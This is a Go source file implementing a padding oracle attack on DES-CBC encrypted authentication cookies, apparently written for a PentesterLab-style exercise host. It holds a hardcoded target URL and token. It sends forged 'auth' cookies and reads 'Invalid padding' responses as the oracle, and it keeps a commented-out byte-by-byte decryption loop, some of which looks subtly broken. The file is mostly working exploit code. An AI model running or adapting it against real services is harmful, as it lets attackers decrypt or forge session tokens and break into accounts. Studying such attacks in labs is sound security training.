package main

import (
	"crypto/des"
	"cryptography-go/utils"
	"encoding/base64"
	"errors"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

const (
	urlBase   = "http://ptl-1cb77fbd-3470ab74.libcurl.so/"
	authToken = "u7bvLewln6PJPSAbMb5pFfnCHSEd6olf"
)

func main() {
	decoded, err := base64.RawStdEncoding.DecodeString(authToken)
	fatal(err)
	bs := des.BlockSize

	// break ciphertext into blocksize chunks
	chunks := utils.BuildChunks(decoded, bs)
	// fmt.Println("[*] Splitting into chunks:")
	// for i := 0; i < len(chunks); i++ {
	// 	fmt.Printf("%d: %v\n", i, chunks[i])
	// }

	utils.PaddingOracle(chunks, urlBase, callOracle, encodeToken)
}

func fatal(err error) {
	if err != nil {
		log.Fatalln(err)
	}
}

func encodeToken(buffer []byte) string {
	encoded := base64.StdEncoding.EncodeToString(buffer)
	// return strings.ReplaceAll(encoded, "=", "")
	return url.QueryEscape(encoded)
}

func callOracle(u, token string) bool {
	req, err := http.NewRequest("GET", u, nil)
	fatal(err)
	req.AddCookie(&http.Cookie{Name: "auth", Value: token})

	client := &http.Client{}
	resp, err := client.Do(req)
	fatal(err)
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		err = errors.New(u +
			"\nresp.StatusCode: " + strconv.Itoa(resp.StatusCode))
		return false
	}

	body, _ := ioutil.ReadAll(resp.Body)
	if isValidPad(string(body)) {
		return true
	}
	return false
}

func isValidPad(body string) bool {
	// Response body contains text "Invalid padding"
	if strings.Contains(body, "Invalid padding") {
		return false
	}
	return true
}

/*
func setAttackBlock(chunks [][]byte, i int) ([]byte, []byte) {
	curr := chunks[i]
	prev := chunks[i-1]
	// fmt.Println("[*] Current Attack Block:")
	// fmt.Printf("C: %v\n", curr)
	return curr, prev
}

// create string C'||Cn to send to oracle with every possible value of C'[k] until find value that has valid padding
func attack(chunks [][]byte) []byte {
	chunkIdx := len(chunks) - 1
	plaintext := make([]byte, 0)
	// Loop through every chunk beginning with the last
	for i := chunkIdx; i >= 0; i-- {
		curr, prev := setAttackBlock(chunks, i)
		interm := make([]byte, len(curr))
		// begin with padding byte 01
		padByte := byte(1)
		// loop through every position of chunk, beginning with last
		for chunkPos := len(curr) - 1; chunkPos >= 0; chunkPos-- {
			fmt.Printf("[*] Forcing padding byte %d\n", padByte)
			// try every possible byte value to check valid padding
			for chr := 0; chr < 256; chr++ {
				cookie := bakeCookie(curr, interm, chunkPos, byte(chr), padByte)
				// TODO speed up with concurrency
				isValid, err := callOracle(urlBase, cookie)
				fatal(err)
				if isValid {
					fmt.Printf("Padding valid with %v\n", byte(chr))
					// Solve I2 = C1' ^ P2' and P2 = C1 ^ I2
					var pByte byte
					interm[chunkPos], pByte = solveByte(prev[i], byte(chr), padByte)
					// unshift / prepend to plaintext bytes slice
					plaintext = append([]byte{pByte}, plaintext...)
					break
				}
			}
			// Move on to next padding byte 02, 03, 04... until end of blocksize
			padByte++
			fmt.Println(plaintext)
		}
		chunkIdx--
	}
	return nil
}

func solveByte(ciphertext, chr, padByte byte) (byte, byte) {
	interm := chr ^ padByte
	plaintext := interm ^ ciphertext
	return interm, plaintext
}

func bakeCookie(curr, interm []byte, chunkPos int, chr, padByte byte) string {
	// create C1' block of random characters
	tmp := []byte(strings.Repeat("a", len(curr)))
	for attackPos := len(curr) - 1; attackPos >= chunkPos; attackPos-- {
		tmp[attackPos] = subAttackBytes(interm[attackPos], chr, padByte)
	}
	fmt.Printf("[-] Attempt attack with: %v\n", tmp)
	test := append(tmp, curr...)
	// fmt.Printf("Test: %v\n", test)
	cookie := base64.RawStdEncoding.EncodeToString(test)
	return cookie
}

func subAttackBytes(interm, chr, padByte byte) byte {
	// if intermediate value exists, fill that in
	var tmp byte
	if interm != 0 {
		// force intermediate value to desired current padByte
		tmp = interm ^ padByte
	} else {
		tmp = chr
	}
	return tmp
}
*/
